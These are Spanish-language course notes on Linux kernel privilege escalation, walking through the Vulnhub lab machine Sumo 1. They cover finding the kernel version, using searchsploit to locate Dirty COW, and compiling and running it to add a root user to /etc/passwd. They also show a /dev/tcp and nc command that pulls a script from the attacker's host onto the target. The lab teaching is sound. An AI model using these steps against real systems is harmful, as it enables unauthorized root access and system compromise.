- Tags : #escalada #escalada_privilegios #escalada_privilegios_linux #escalada_privilegios_explotacion_kernel

El **kernel** es la parte central del sistema operativo Linux, que se encarga de administrar los recursos del sistema, como la memoria, los procesos, los archivos y los dispositivos. Debido a su papel crítico en el sistema, cualquier vulnerabilidad en el kernel puede tener graves consecuencias para la seguridad del sistema.

En versiones antiguas del kernel de Linux, se han descubierto vulnerabilidades que pueden ser explotadas para permitir a los atacantes obtener acceso de superusuario (**root**) en el sistema.

La elevación de privilegios se refiere a la técnica utilizada por los atacantes para obtener permisos elevados en el sistema, como superusuario (**root**), cuando solo tienen permisos limitados. Por ejemplo, un usuario con permisos limitados en el sistema podría utilizar una vulnerabilidad en el kernel para obtener acceso de superusuario y, posteriormente, comprometer el sistema.

Las vulnerabilidades del kernel pueden ser explotadas de varias maneras. Por ejemplo, un atacante podría aprovechar una vulnerabilidad en un controlador de dispositivo para obtener acceso al kernel y realizar operaciones maliciosas. Otra forma común en que se explotan las vulnerabilidades del kernel es mediante el uso de técnicas de desbordamiento de búfer, que permiten a los atacantes escribir código malicioso en áreas de memoria reservadas para el kernel.

Para mitigar el riesgo de vulnerabilidades del kernel, es importante mantener actualizado el sistema operativo y aplicar parches de seguridad tan pronto como estén disponibles.

A continuación, se os comparte el enlace a la máquina Sumo 1 de Vulnhub, la cual estaremos desplegando en esta clase para mostrar un ejemplo práctico de explotación del kernel:

- **Máquina Sumo 1**: [https://www.vulnhub.com/entry/sumo-1,480/](https://www.vulnhub.com/entry/sumo-1,480/)

En este ejemplo miraremos la version de kernel que lleva la maquina y buscaremos con **searchsploit** si para esta version del kernel existe alguna via de escalada de privilegios.

```bash
lsb_release -a #Para ver la info de SO
uname -a       #Muestra la version del kernel
```

![](../../../attachments/Pasted%20image%2020260220164733.png)

```bash
#Buscar sploits en searchsploit relacionados con la version del kernel
searchsploit kernel 3.2

searchsploit kernel 3.2 dirty cow

```

![](../../../attachments/Pasted%20image%2020260220165305.png)

Este exploit lo que hace es sobreescribir el **/etc/passwd** agregando un usuario con privilegios de root solicitando un password para este nevo usuario que proporcinamos como atacante.

Como es un binario de *c*  debemos compilarlo, en la mayoria de los casos en el mismo script trae como compilarlo

```bash
grep gcc dirtycow.c
```

![](../../../attachments/Pasted%20image%2020260220173030.png)

Compilamos 
```bash
gcc -pthread nombre.c -o nombre_salida -lcrypt

gcc -pthread dirti.c -o dirty -lcrypt
```

![](../../../attachments/Pasted%20image%2020260220173316.png)

Ejecutamos el ompilado

```bash
./dirty
#Nos pedira una pass para el usuario por defecto que agrega el sploit
```

![](../../../attachments/Pasted%20image%2020260220173657.png)

![](../../../attachments/Pasted%20image%2020260220173807.png)

Entramos como firefart y vemos sus proiedades
```bash
su firefart   #Ponemos el pass que introdcimos en el sploit
```

Revisamos sus privilegios

![](../../../attachments/Pasted%20image%2020260220174000.png)

Si queremos reestablecer el /etc/passwd  en la carpeta /etc se guarda una copia llamada passwd-

![](../../../attachments/Pasted%20image%2020260221073442.png)

Tenemos la herramienta  *linux-exploit-suggester.sh* que nos es util para sugerirnos vulnerabilidades en el kernel , esta se instala en kali con un simple *apt install linux-exploit-suggester*  luego nos la enviamos a la maquina objetivo con *cat y nc*

```bash
#El el Objetivo ponemos este comando
cat < /dev/tcp/172.17.0.1/4646 > linux-exploit-suggester.sh

#En el atacante nos movemos donde esta es script `/usr/share/linux-exploit-suggester` y lo servimos con `nc`

nc -nlvp 4646 < linux-exploit-suggester.sh

```